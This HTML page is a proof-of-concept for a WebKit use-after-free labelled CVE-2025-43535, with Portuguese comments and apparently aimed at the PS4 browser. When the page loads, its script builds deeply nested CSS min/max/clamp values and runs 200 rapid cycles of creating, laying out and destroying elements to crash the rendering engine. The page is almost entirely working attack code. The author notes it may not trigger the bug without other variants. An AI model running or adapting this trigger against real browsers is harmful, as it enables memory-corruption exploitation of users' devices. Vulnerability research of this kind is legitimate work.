<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>CVE-2025-43535 PoC — UAF Churning</title>
<style>
  body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
  #log { background:#111; border:1px solid #88ff88; padding:12px;
         height:320px; overflow-y:auto; font-size:12px; }
  .ok{color:#00ff88} .fail{color:#ff4444} .info{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
</style>
</head>
<body>
<h3>CVE-2025-43535 — Memory Churning (Caçando o UAF)</h3>
<div id="log"></div>

<script>
"use strict";

const L=(m,c)=>{const d=document.getElementById('log');
  d.innerHTML+=`<div class="${c||'info'}">[${Date.now()%100000}] ${m}</div>`;
  d.scrollTop=d.scrollHeight;
};

// Nesta estratégia, pausas são curtas apenas para evitar freeze da UI, 
// pois QUEREMOS que o Garbage Collector se atropele
const yieldRace = () => new Promise(r => setTimeout(r, 0)); 

async function trigger_uaf_churn() {
  L("[V1] Gerando payload matemático seguro (Nível 22)...");

  // Mantemos o cache para não gastar CPU do JS, queremos estressar o C++
  const mathCache = {};
  function makeMathNested(depth) {
    if (depth <= 0) return 'var(--dyn-val, 10px)'; // Introduzindo variável dinâmica
    if (mathCache[depth]) return mathCache[depth];

    const funcs = ['min', 'max', 'clamp'];
    const f = funcs[depth % 3];
    let result = '';

    if (f === 'clamp') {
      result = `clamp(${makeMathNested(depth-1)}, ${depth*5}px, ${makeMathNested(depth-2 < 0 ? 0 : depth-2)})`;
    } else {
      result = `${f}(${makeMathNested(depth-1)}, ${makeMathNested(depth-1)})`;
    }

    mathCache[depth] = result;
    return result;
  }

  // Nível 22 é seguro e não causa OOM no PS4, mas é complexo o suficiente para o parser
  const safePayload = makeMathNested(22); 
  const container = document.createElement('div');
  document.body.appendChild(container);

  L("[V1] Iniciando ciclo de Memory Churning (Criar -> Layout -> Destruir)...");

  // Fazemos 200 ciclos de alocação/liberação agressiva
  for (let ciclo = 0; ciclo < 200; ciclo++) {
    try {
      // 1. Cria 5 elementos simultâneos
      for (let i = 0; i < 5; i++) {
        let el = document.createElement('div');
        el.style.position = 'absolute';
        // Alterna variáveis CSS no meio do cálculo para confundir o resolver
        el.style.setProperty('--dyn-val', (ciclo % 2 === 0) ? '15px' : '5vw');
        el.style.width = safePayload; 
        container.appendChild(el);
      }

      // 2. Força o WebKit (C++) a processar toda a matemática AGORA
      void container.offsetWidth; 

      // 3. Destrói tudo imediatamente enquanto o C++ ainda pode estar lidando com nós internos
      container.innerHTML = ''; 
      
      // 4. Força um novo layout na árvore vazia
      void container.offsetWidth;

      if (ciclo % 20 === 0) {
        L(`[V1] Ciclo de agitação ${ciclo}/200 concluído.`);
        await yieldRace(); // Respiro microscópico
      }
    } catch(e) {
      L(`[V1] Exceção no ciclo ${ciclo}: ${e}`, "fail");
    }
  }

  document.body.removeChild(container);
  L("[V1] Churning Finalizado. Se o WebKit tem um UAF aqui, ele deve cair agora.", "ok");
}

async function main() {
  try {
    await trigger_uaf_churn();
    L("=== FIM DA EXECUÇÃO ===", "ok");
    L("Caso não crashe, o trigger exato do CVE pode depender das Variantes 3 ou 4 originais.", "info");
  } catch(e) {
    L("EXCEÇÃO FATAL: " + e.toString(), "fail");
  }
}

window.addEventListener('load', () => setTimeout(main, 500));
</script>
</body>
</html>
